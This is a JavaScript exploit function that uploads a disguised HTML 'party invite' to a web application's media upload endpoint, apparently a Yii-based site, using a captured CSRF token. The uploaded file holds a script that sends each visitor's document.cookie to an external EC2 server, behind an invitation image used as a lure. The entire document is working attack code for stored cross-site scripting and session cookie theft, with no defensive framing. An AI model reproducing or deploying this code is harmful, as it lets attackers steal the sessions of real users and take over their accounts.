function exploit1() {
    // Define a boundary, I stole this from IE but you can use any string AFAIK
var data = "<html>"+
'<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>'+
'<script>'+
    '$(document).ready(function() {'+
        '$.post("http://ec2-46-137-197-194.ap-southeast-1.compute.amazonaws.com/websecadd.php?message="+document.cookie); });'+
'</script> <img src="http://chelseanicoleblog.com/wp-content/uploads/2009/09/jayse-and-chelsea-dexter-premiere-party-invitation.jpg"/></html>';
var boundary = "---------------------------7da24f2e50046";
var file = '--' + boundary + '\r\n'
         // Parameter name is "file" and local filename is "temp.txt"
         + 'Content-Disposition: form-data; name="upload";'
         + 'filename="party_invite.html"\r\n'
         // Add the file's mime-type
         + 'Content-type: plain/text\r\n\r\n'
         // Add your data:
         + data + '\r\n'
         + '--' + boundary + '--';

var parameter = '--' + boundary + '\r\n'
        + 'Content-Disposition: form-data; name="YII_CSRF_TOKEN"\r\n\r\n'
        + csrfToken + '\r\n'
         + '--' + boundary + '--';

var body = parameter + '\r\n' + file;
$.ajax({
    contentType: "multipart/form-data; boundary="+boundary,
    data: body,
    type: "POST",
    url: "/index.php/media/ajaxUpload?YII_CSRF_TOKEN="+csrfToken+"&CKEditorFuncNum=1",
    success: function (data, status) {
    }
});

var malicious_url = '/uploads/media/<malicious_username>/party_invite.html'
alert("File uploaded");
}
